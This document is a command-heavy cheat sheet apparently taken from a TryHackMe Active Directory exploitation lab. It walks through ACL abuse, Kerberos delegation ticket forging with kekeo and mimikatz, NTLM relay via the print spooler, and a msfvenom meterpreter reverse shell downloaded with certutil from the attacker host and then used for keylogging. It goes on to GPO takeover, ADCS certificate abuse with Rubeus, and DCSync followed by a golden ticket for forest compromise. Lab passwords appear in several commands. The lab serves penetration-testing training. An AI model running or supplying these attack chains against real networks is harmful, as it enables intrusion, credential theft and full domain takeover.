### exploit active directory ###
## links ##
https://tryhackme.com/room/exploitingad


## helps ##
# to interact with AD
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
https://github.com/PowerShellMafia/PowerSploit


###########################
## Permission delegation ##
###########################
# exploit permission delegation misconfigurations (aka CL-based attacks)
# some examples
ForceChangePassword >  We have the ability to set the user's current password without knowing their current password.
AddMembers          > Ability to add users (including our own account), groups or computers to the target group.
GenericAll          > We have complete control object, including ability to change the user's password,
                      register an SPN or add an AD object to the target group.
GenericWrite        > We can update any non-protected parameters of our target object.
                      Allow us to, update the scriptPath parameter,
                      which would cause a script to execute the next time the user logs on.
WriteOwner          > We have the ability to update the owner of the target object.
                      We could make ourselves the owner, to gain additional permissions over the object.
WriteDACL           > We have the ability to write new ACEs to the target object's DACL.
                      We could, write an ACE that grants our account full control over the target object.
AllExtendedRights   > Ability to perform any action with extended AD rights against target object.
		      This includes, for example, the ability to force change a user's password.

# Follow bloodhound map to escalate
# Add Member example. Bad misconfig, "Domain Users group" is able to addMember to "IT support group"
PS> Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"		# add you to a new group
PS> Get-ADGroupMember -Identity "IT Support"					# check if it works
PS> gpupdate /force								# may sync happen faster
# permissions may take time to propagate. gpupdate then disconnect and reconnect

# ForceChangePassword example. "IT Support" may have the right to change admin password
PS> Get-ADGroupMember -Identity "Tier 2 Admins"					# list member of T2 admins
PS> $Password = ConvertTo-SecureString "New.Pass.User" -AsPlainText -Force 	# new pass and update pass
PS> Set-ADAccountPassword -Identity "AD.User.Target" -Reset -NewPassword $Password 


#########################
## Kerberos delegation ##
#########################
# Unconstrained Delegation provides no limits to the delegation
# Constrained Delegation restricts what services account can be delegated to, limit exposure if account is compromised
# Example of services that can be configured for delegation
HTTP - Used for web applications to allow pass-through authentication using AD credentials.
CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
HOST - Allows delegation of account for all activities on the host.
MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

# Enumeration of available delegations
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth
# As admin dump LSASecrets
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz # token::elevate
mimikatz # lsadump::secrets

# generate ticket TGT
C:\Tools\kekeo\x64\kekeo.exe
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
ticket => TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# generate ticket TGS for both service HTTP and WSMAN
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
ticket => TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
ticket => TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kekeo # exit

# import TGS in mimikatz
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # exit
klist										# to check all is imported

# create new session to THMSERVER1
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami


##############################
## exploit automated relays ##
##############################
# customer bloodhound query
# is a computer has the "AdminTo" relationship over another computer
# MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
# MUST met those:
- A valid set of AD account credentials.
- Network connectivity to the target's SMB service.
- The target host must be running the Print Spooler service.
- The hosts must not have SMB signing enforced.

# is Print Spooler service is running ?
PS> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc			# this command
PS> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc			# or this one

# is SMB signing enforced ?
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc

# set up NTLM relay
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.83.201" -debug
SRV1> C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "ATTACKER_IP"
python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug


######################
## Exploit AD Users ##
######################
# keylog user
ATT> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.81.6 LPORT="4567" -f psh -o shell.ps1
ATT> msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.81.6; set LPORT 4567; exploit"
ATT> python -m http.server
PWN> certutil.exe -urlcache -split -f http://10.50.81.6:8000/shell.ps1
PWN> . .\shell.ps1
meterpreter > ps | grep "explorer"
meterpreter > migrate PID
meterpreter > getuid
meterpreter > keyscan_start
meterpreter > keyscan_dump


##################
## Exploit GPOs ##
##################
# explore new creds found with bloodhound: svcservman@za.tryhackme.loc
# RDP in another server with one of our user
xfreerdp /cert-ignore /bpp:8 +clipboard /u:t2_henry.shaw /p:Newcastle1988 /v:10.200.83.248:3389
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe		# runs as with founded user
dir \\za.tryhackme.loc\sysvol						# this user have access to sysvol
mmc
Click File -> Add/Remove Snap-in
Select the Group Policy Management snap-in and click Add
Click Ok
Servers > Management Servers> Management Server Pushes
We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window
Expand Computer Configuration
Expand Policies
Expand Windows Settings
Expand Security Settings
Right Click on Restricted Groups and select Add Group (If the IT Support group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
Click Browse, enter IT Support and  click Check Names
Click Okay twice
The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users
Once the configuration has been made, we can click Apply and OK
Now, all we need to do is wait for a maximum of 15 minutes for the GPO to be applied
After this, our initial account that we made a member of the IT Support group will now have administrative and RDP permissions on THMSERVER2!
# rdp in new server
xfreerdp /cert-ignore /bpp:8 +clipboard /u:sarah.hilton /p:Newcastle1988 /v:10.200.83.202:3389


##########################
## Exploit Certificates ##
##########################
# find vulnerable certif templates
# or https://github.com/GhostPack/PSPKIAudit
certutil -Template -v > templates.txt

# we need this combination of parameters
Client Authentication - The certificate can be used for Client Authentication.
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
Certificate Permissions - We have the required permissions to use the certificate template.

# then
mmc
Click File->Add/Remove Snap-in..
Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
Click OK

# We will request a personal certificate:
Right Click on Personal and select All Tasks->Request New Certificate...
Click Next twice to select the AD enrollment policy.
You will see that we have one template that we can request, but first, we need to provide additional information.
Click on the More Information warning.
Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
Change the Alternative name Type option to User principal name.
Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.
click Apply and OK. Then, select the certificate and click Enroll. You should be able to see your certificate

# The last step is to export our certificate with the private key:
Right-click on the certificate and select All Tasks->Export...
Click Next, select Yes, export the private key, and click Next.
Click Next, then set a password for the certificate since the private key cannot be exported without a password.
Click Next and select a location to store the certificate.
Click Next and finally click Finish

# get TGT
.\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
# load TGT
mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # exit
dir \\THMDC.za.tryhackme.loc\c$\						# we have access to THMDC


###########################
## Exploit Domain Trusts ##
###########################
# There are two main types of trusts that can be configured between domains:
Directional - The direction of the trust flows from a trusting domain to a trusted domain
Transitive - The trust relationship expands beyond just two domains to include other trusted domains

# In order to forge TGTs, we need the following information:
The FQDN of the domain
The Security Identifier (SID) of the domain
The username of the account we want to impersonate
The KRBTGT password hash

# We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on THMSERVER2:
mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:za\krbtgt				# get ntlm hash
	16f9af38fca3ada405386b3b57366082				# ntlm hash example

# Using the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child domain
# The key here is that we will exploit the trust the parent domain has with our child domain by
# adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain
# controller of the child domain. The EA group belongs to the parent domain and membership to this group
# essentially grants Administrative privileges over the entire forest!
# The default SID for this group is S-1-5-21-<RootDomain>-519.

# Before we can go into exploitation, we first need to recover two SIDs:
The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT
PS> Get-ADComputer -Identity "THMDC"
	S-1-5-21-3885271727-2693558621-2658995185-1001
PS> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
	S-1-5-21-3330634377-1326264276-632209373-519

# gen golden ticket
mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
dir \\thmdc.za.tryhackme.loc\c$							# check access
dir \\thmrootdc.tryhackme.loc\c$\						# check dc root access














